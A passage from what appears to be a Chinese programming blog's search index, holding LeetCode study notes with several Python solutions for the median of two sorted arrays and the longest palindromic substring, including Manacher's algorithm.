while(j&lt;len(nums2)): nums3.append(nums2[j]) j+=1 if(flag == 1): return nums3[mid] else: return (nums3[mid-1]+nums3[mid])/2但是题目的要求时间复杂度为$O(log(m+n))$，虽然提交成功了，但我们需要降低时间复杂度啊…一看到log，那肯定是要用到二分法啊，看了评论区大佬的解答，还有下面两种解法。 解法2：取第k小的数所谓取中位数，那么不就是取第k小的数吗，如果是奇数，那就是取最中间那个数，也就是k = (m+n+1)/2，如果是偶数，那就是取k1 = (m+n+1)/2和k2 =（m+n+2)/2位置数的平均值。这里可以用到一个小trick，因为当数组维数是奇数的时候，(m+n+1)是偶数，我们进行的又是模2运算，因此变成k = (m+n+2)/2和原来是相等的，这样也变成和偶数时一样的k1和k2，就可以不用分情况讨论了。所以接下来我们所要求的就是第k1小的和第k2小的数，然后二者相加除以二就是我们最终的答案了。那接下来问题就转化为如何在两个数组中求第k小的数，题目要求中时间复杂度要为$O(log(m+n))$，因此我们要用到二分法，也就是说，我们可以在两个数组中分别取前k/2个数（因为是有序数组嘛，前k/2也就是k/2个较小的，降序反之亦然），比较取出的这两组数据的最后一位哪个更小，我们便去掉该k/2个，如果相等就随便去掉那一组都可以。但是还有一个问题：当某一组数不够k/2的时候，那就将其最后一个数与另一组第k/2个比较，如果这组数都被淘汰了，那就剩一组数据了，在一组数据中取第k小的数就可以直接return了。因此在取k/2之前我们还要判断数组的数量够不够。之后进行递归，因为去掉了k/2个数，因此下一轮的k = k - k/2，直到当k = 1时，递归结束，这时候每组数据都取了一个，k = 1的意思不就是取最小的数嘛，所以只要比较这两个数哪一个更小，哪一个就是答案。123456789101112131415161718192021222324252627282930313233343536#O(log(m+n))class Solution: def findMedianSortedArrays(self, nums1, nums2): m = len(nums1) n = len(nums2) left = (m+n+1)//2 right = (m+n+2)//2 return (self.findKth(nums1, nums2, left) + self.findKth(nums1, nums2, right))/2 # 取第k小的数 def findKth(self, nums1, nums2, k): # 注意判断列表为空时不能用 nums1 == None # 因为取第k小的数一定有答案，因此不存在两个数组都为空的情况 if len(nums1) == 0: return nums2[k-1] if len(nums2) == 0: return nums1[k-1] # 正常的递归结束出口 if k==1: return min(nums1[k-1], nums2[k-1]) # k!=1，进行递归，可以利用列表的切片功能轻松返回剩余数组 else: n = k//2 if n &gt; len(nums1): if nums1[-1] &lt; nums2[n-1]: return self.findKth([], nums2, k-len(nums1)) else: return self.findKth(nums1, nums2[n:], k-n) if n &gt; len(nums2): if nums2[-1] &lt; nums1[n-1]: return self.findKth(nums1, [], k-len(nums2)) else: return self.findKth(nums1[n:], nums2, k-n) if nums1[n-1] &lt; nums2[n-1]: return self.findKth(nums1[n:], nums2, k-n) else: return self.findKth(nums1, nums2[n:], k-n) 解法3: 从中位数的定义出发解析主要参考LeetCode用户windliang的题解。 因为中位数的定义是一个可以将数值集合划分为相等的上下两部分的一个数值，因此我们可以考虑对题中给的两个数组进行划分，划分成左右两个部分，如下图所示：当我们用i和j把A、B数组划分为这样的两个部分，如果满足下列条件： A_left + B_left == A_right + B_right (如果len(A)+len(B)为奇数，就让左半部分比又半部分多一个，这样中位数就是左半部分最后一个值) max(A_left[i-1], B_left[j-1]) &lt; min(A_right[i], B_right[j]) 那么我们就可以得到中位数的答案： 如果len(A)+len(B)为奇数，ans = max(A_left[i-1], B_left[j-1]) 如果len(A)+len(B)为偶数，ans = (max(A_left[i-1], B_left[j-1]) + min(A_right[i], B_right[j])) / 2 对第一个条件，要使他们划分成这样的两个部分，那么i和j具体值应该取多少呢？为了降低时间复杂度，i的取值可以用二分法，而j又与i有直接关系，假设len(A) = m,len(B) = n,(m+n)%2 == 0因为i + j = m - i + n - j故j = (m + n)/2 - i当(m+n)%2 == 1时，有i + j = m - i + n - j + 1，故j = (m + n + 1)/2 - i 由于当(m+n)%2 == 0时，模2和加1之后再模2的值相等，因此j的取值公式可以通用为j = (m + n + 1)/2 - i当我们把i当作自变量时，0 &lt;= i &lt;= m，为了保证0 &lt;= j &lt;= m，因此我们要使m &lt;= n 对于第二个条件，因为题目给的数组是有序的，自然会满足A_left[i-1] &lt; A_right[i]和B_left[j-1] &lt; B_right[j]因此我们只要使A_left[i-1] &lt; B_right[j]和B_left[j-1] &lt; A_right[i]就可以满足了第二个条件。当不满足该条件时可以发现有两种情况： i &lt; m and j &gt; 0 and B_left[j-1] &gt; A_right[i]这时需要增加i，（从上面j的公式可以看出当i&lt;m时，j一定大于0，因此条件可以简化为i &lt; m and B_left[j-1] &gt; A_right[i]） i &gt; 0 and j &lt; n and A_left[i-1] &gt; B_right[j]这时需要减小i，（从上面j的公式可以看出当i&gt;0时，j一定小于n，因此条件可以简化为i &gt; 0 and A_left[i-1] &gt; B_right[j]） 另外还有两种边界情况（具体可分为4种），即i = 0和i = m，具体可分为i = 0, j != n i = 0, j = n i = m, j = 0 i = m, j != 0 12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution: def findMedianSortedArrays(self, nums1, nums2): m = len(nums1) n = len(nums2) if m &gt; n: #m需要小于等于n nums1, nums2, m, n = nums2, nums1, n, m if m == 0: return (nums2[(n+1)//2-1]+nums2[(n+2)//2-1])/2.0 imin, imax, half_len = 0, m, (m+n+1) // 2 #二分法确定i的值 while imin &lt;= imax: i = (imin + imax) // 2 j = half_len - i if i &lt; m and nums2[j-1] &gt; nums1[i]: imin = i + 1 elif i &gt; 0 and nums1[i-1] &gt; nums2[j]: imax = i - 1 #达到要求，将边界情况列出分别讨论 else: if i==0 : max_of_left = nums2[j-1] if(j!=n): max_of_right = min(nums1[i], nums2[j]) else: max_of_right = nums1[i] break elif i==m: if(j!=0): max_of_left = max(nums1[i-1], nums2[j-1]) else: max_of_left = nums1[i-1] max_of_right = nums2[j] break #一般情况 else: max_of_left = max(nums1[i-1], nums2[j-1]) max_of_right = min(nums1[i], nums2[j]) break if (m+n)%2 == 1: return max_of_left else: return (max_of_right+max_of_left)/2.0","link":"/2019/11/14/leetcode-day2/"},{"title":"LeetCode DAY 3 (5)","text":"这些题都好难啊…越来越觉得自己是个铁fw了…呜呜呜 5. 最长回文子串（中等）题目描述给定一个字符串s，找到s中最长的回文子串。你可以假设s的最大长度为1000。 示例1:123输入: \"babad\"输出: \"bab\"注意: \"aba\" 也是一个有效答案。 示例2:12输入: \"cbbd\"输出: \"bb\" 代码解法1：暴力解法作为一个铁fw第一个想到的办法肯定是暴力解决了，lz遍历你所有的子串还不能找出答案？具体做法就是两个for循环遍历所有子串，然后在最内循环里进行判断该子串是不是回文串。因此我们需要定义一个判断是否为回文串的函数，该函数也很暴力，就直接遍历该子串看对应位置的字符是否相同。因此该算法的时间复杂度为$O(n^{3})$1234567891011121314151617#暴力解法，时间复杂度O(n^3) 空间复杂度O(1)class Solution(object): def longestPalindrome(self, s): max = 0 s_tmp = '' for i in range(0, len(s)): for j in range(i+1, len(s)+1): if self.isPalindrome(s[i:j]) and (j-i) &gt; max : s_tmp = s[i:j] max = j-i return s_tmp #判断是否为回文串 def isPalindrome(self, s): for i in range(0, len(s)/2): if(s[i] != s[len(s)-i-1]): return False return True 解法2：最长公共子串还有一种办法就是求最长公共子串，具体做法就是将字符串反转，找出反转前后的公共子串，就是回文串（除一种情况外），比如&#39;abad&#39;，反转之后为&#39;daba&#39;，最长公共子串就是&#39;aba&#39;。但是有一种情况除外，比如&#39;abcdefgdcba&#39;，反转之后为&#39;abcdgfeabcd&#39;，可以看到反转前后的最长公共子串为&#39;abcd&#39;，但它明显不是回文串，这种情况的特征是反转前后字符下标并不一致，因此求出反转前后的最长公共子串后我们需要判断下标是否对应。但现在还有最后两个问题，怎么求最大公共子串以及下标是否对应如何判断。看了大佬们的解析的我恍然大悟……奈何自己太菜… 求最长公共子串：我们可以定义一个二维数组，可以想象成一个表格，横向代表原字符串序列，纵向代表反转后字符串序列，假设横向坐标用i表示，纵向坐标用j表示。数组用a表示。当s[i] == s_r[j]时，就表示它是公共的一个字符，而此时对应的数组元素a[i][j] == a[i-1][j-1] + 1，因为a[i-1][j-1]的位置就是前一个连续的公共字符，因此a[i][j]的值就代表最长公共子串的长度，而此时的i代表该子串的结束位置，有了结束位置我们也就知道了开始位置，因此就可以取出该子串。对于上面的计算公式a[i][j] == a[i-1][j-1] + 1，为了保证所有值有意义，我们需要分情况讨论，即当i == 0 or j == 0时进行赋值。该数组可参考下图所示： 判断下标是否对应：我们没有必要将公共子串的下标全部进行判断是否对应，我们只需要判断最后一个字符的下标。比如上图所示，我们将i和j对应公共子串的最后一个字符，现在s_re[j]的位置对应着a，那反转之前这个a的下标为before = len(s)-j-1，之后我们还需要加上公共子串的长度才是末尾字符的下标，因此判断before + a[i][j] - 1 == i，如果相等则为公共子串。 1234567891011121314151617181920212223#时间复杂度O(n^2) 空间复杂度O(n^2)class Solution(object): def longestPalindrome(self, s): s_reverse = s[::-1] max_len = 0 #最大公共子串长度 max_end = 0 #最大公共子串结束位置 index = &#123;&#125; #构建二维数组 python中只好先定义一个字典 for i in range(0,len(s)): index[i] = &#123;&#125; #通过循环构建二维数组 for j in range(0, len(s)): index[i][j] = 0 #初始化二维数组 if s[i] == s_reverse[j]: if i==0 or j==0: index[i][j] = 1 else: index[i][j] = index[i-1][j-1] + 1 if index[i][j] &gt; max_len: before_num = len(s) - 1 - j #判断是否真的是回文串 if before_num + index[i][j] - 1 == i: max_len = index[i][j] max_end = i return s[max_end-max_len+1:max_end+1]但即使这个复杂度的代码提交还是时间超出限制我哭了，更低复杂度的代码等明天看懂再更…… 解法3：暴力破解优化在解法一中，我们对每一个子串都进行了判断是不是回文串，但每一次判断都会有$O(n)$的时间复杂度，如果我们能优化掉判断带来的时间复杂度，就可以将总的时间复杂度降为$O(n^{3})$，根据回文串的特点，在$P(i,j)$是回文串的基础上，如果s[i-1] == s[j+1]，那么$P(i-1,j+1)$也是回文串，因此我们将暴力解法中的判断函数改为这种判断方式。但有两种情况需要特殊对待，当子串的个数是1或者2时，此时的i-1和j+1将会将i和j的顺序颠倒产生错误，因此这两种情况需要额外判断。此外，我们需要定义一个数组，用来存储$P(i,j)$是否为回文串的结果。123456789101112131415161718#时间复杂度O(n^2) 空间复杂度O(n^2)class Solution(object): def longestPalindrome(self, s): arra = [[0 for i in range(len(s))] for i in range(len(s))] max_len = 0 max_str = '' for length in range(1, len(s)+1): for start in range(0, len(s)): end = start + length - 1 if(end&gt;=len(s)): break if (length==1 or length==2 or arra[start+1][end-1]==1) and s[start] == s[end]: arra[start][end] = 1 if length &gt; max_len: max_str = s[start:end+1] else: arra[start][end] = 0 return max_str 解法4：扩展中心我们在解法3中提到，假设一个子串$P(i,j)$为回文串，如果s[i-1] == s[j+1]，那$P(i-1,j+1)$也是回文串，因此我们可以在已是回文串的子串的基础上进行中心扩展，那最初的中心怎么找呢？我们可以发现，最初的子串只有长度为1和长度为2两种情况，而长度为1的子串共有len(s)种，长度为2的子串共有len(s)-1种，因此我们应该循环2*len(s)-1次，在循环中判断此时中心是单个字符还是两个字符，之后进行中心扩展。12345678910111213141516171819202122#时间复杂度O(n^2) 空间复杂度O(1)class Solution(object): def longestPalindrome(self, s): max_len = 0 max_str = '' for i in range(2*len(s) - 1): if i % 2 == 1: start = (i-1) // 2 end = start + 1 if(s[start] == s[end]): while start &gt; 0 and end &lt; len(s)-1 and s[start-1] == s[end+1]: start -= 1 end += 1 else: start = end = i // 2 while start &gt; 0 and end &lt; len(s)-1 and s[start-1] == s[end+1]: start -= 1 end +=1 if (end-start+1) &gt; max_len and s[start]==s[end]: max_len = end-start+1 max_str = s[start:end+1] return max_str 解法5：Manacher’s Algorithm 马拉车算法解法5 转自 LeetCode 用户 windliang 的题解。马拉车算法Manacher‘s Algorithm是用来查找一个字符串的最长回文子串的线性方法，由一个叫 Manacher 的人在 1975 年发明的，这个方法的最大贡献是在于将时间复杂度提升到了线性。 预处理首先我们解决下奇数和偶数的问题，在每个字符间插入”#”，并且为了使得扩展的过程中，到边界后自动结束，在两端分别插入”^”和 “$”，两个不可能在字符串中出现的字符，这样中心扩展的时候，判断两端字符是否相等的时候，如果到了边界就一定会不相等，从而出了循环。经过处理，字符串的长度永远都是奇数了。 我们用一个数组P保存从中心扩展的最大个数，而它刚好也是去掉”#”的原字符串的总长度。例如下图中下标是6的地方，可以看到P[6]等于5，所以它是从左边扩展5个字符，相应的右边也是扩展5个字符，也就是#c#b#c#b#c#。而去掉#恢复到原来的字符串，变成cbcbc，它的长度刚好也就是5。 求原字符串下标用P的下标减去P[i]，再模2，就是原字符串的开头字符下标了。例如我们找到P[i]的最大值为5，也就是回文串的最大长度是5，对应的下标是6，所以原字符串的开头下标是(6 - 5)/ 2 = 0。所以我们只需要返回原字符串的s[0:5]就可以了。 求每个P[i]接下来是算法的关键了，它充分了利用了回文串的对称性。我们用C表示回文串的中心，用R表示回文串的右边半径。所以R = C + P[i]。C和R所对应的回文串是当前循环中R最靠右的回文串。 我们考虑求P[i]的时候，用i_mirror表示当前需要求的第i个字符关于C对应的下标。现在要求P[i]，如果是用中心扩展法，那就向两边扩展比对就行了。但是我们其实可以利用回文串C的对称性。i关于C的对称点是i_mirror，P[i_mirror] = 3，所以P[i] 也等于3。但是有三种情况将会造成直接赋值为P[i_mirror]是不正确的，下边一一讨论。1. 超出了R当我们要求P[i]的时候，P[mirror] = 7，而此时P[i]并不等于7，为什么呢，因为我们从i开始往后数7个，等于22，已经超过了最右的R，此时不能利用对称性了，但我们一定可以扩展到R的，所以P[i]至少等于R - i = 20 - 15 = 5，会不会更大呢，我们只需要比较T[R+1]和T[R+1]关于 i 的对称点就行了，就像中心扩展法一样一个个扩展。2. P[i_mirror]遇到了原字符串的左边界此时P[i_mirror] = 1，但是P[i]赋值成1是不正确的，出现这种情况的原因是P[i_mirror]在扩展的时候首先是&#39;#&#39; == &#39;#&#39;，之后遇到了 &#39;^&#39; 和另一个字符比较，也就是到了边界，才终止循环的。而P[i]并没有遇到边界，所以我们可以继续通过中心扩展法一步一步向两边扩展就行了。2. i == R此时我们先把P[i]赋值为0，然后通过中心扩展法一步一步扩展就行了。 考虑C和R的更新就这样一步一步的求出每个P[i]，当求出的P[i]的右边界大于当前的R时，我们就需要更新C和R为当前的回文串了。因为我们必须保证i在R里面，所以一旦有更右边的R就要更新R。此时的P[i]求出来将会是3，P[i]对应的右边界将是10 + 3 = 13，所以大于当前的R，我们需要把C更新成i的值，也就是10，R更新成13。继续下边的循环。1234567891011121314151617181920212223242526272829303132333435363738class Solution(object): #字符串预处理 def preprocess(self, s): if len(s) == 0: return '$' else: ret = '^' for i in range(len(s)): ret += '#'+s[i] return ret + '#$' def longestPalindrome(self, s): #预处理 t = self.preprocess(s) P, C, R = [0 for i in range(len(t))], 0, 0 for i in range(1,len(t)-1): i_mirror = 2*C-i if(R&gt;i): #保证i在R内 P[i] = min(R-i, P[i_mirror]) else: #i&lt;=R的时候 P[i] = 0 #上面说的三种情况 #因为其余情况下P[i]已确定，因此不会进入循环 while t[i+1+P[i]] == t[i-1-P[i]]: P[i]+=1 #更新C和R if i + P[i] &gt; R: C = i R = i + P[i] len_max = 0 centerIndex = 0 for i in range(1, len(t)-1): if P[i] &gt; len_max: len_max = P[i] centerIndex = i #根据公式计算start start = (centerIndex - len_max)/2 return s[start:start+len_max]","link":"/2019/11/16/leetcode-day3/"}],"tags":[],"categories":[{"name":"Daily Essays","slug":"Daily-Essays","link":"/categories/Daily-Essays/"},{"name":"软件综合训练课程","slug":"软件综合训练课程","link":"/categories/%E8%BD%AF%E4%BB%B6%E7%BB%BC%E5%90%88%E8%AE%AD%E7%BB%83%E8%AF%BE%E7%A8%8B/"},{"name":"LeetCode系列","slug":"LeetCode系列","link":"/categories/LeetCode%E7%B3%BB%E5%88%97/"},{"name":"数据库系统概论","slug":"数据库系统概论","link":"/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/"},{"name":"爬虫系列","slug":"爬虫系列","link":"/categories/%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97/"}]}